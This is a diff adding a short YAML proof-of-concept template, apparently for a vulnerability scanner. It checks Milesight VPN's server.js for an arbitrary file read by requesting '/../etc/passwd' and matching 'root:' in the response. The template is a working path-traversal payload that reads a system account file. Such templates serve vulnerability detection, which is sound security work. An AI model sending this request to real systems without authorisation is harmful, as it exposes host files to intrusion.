@@ -1,0 +1,14 @@
+id: poc-yaml-milesight-vpn-server.js-file-read
+info:
+  name: Milesight VPN server.js 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: MilesightVPN
+requests:
+- method: GET
+  path: /../etc/passwd
+  expression: status_code == 200 && contains(body,"/bin") && contains(body,"root:")
+    && !contains(body,"<")
+variables: {}
+transport: http
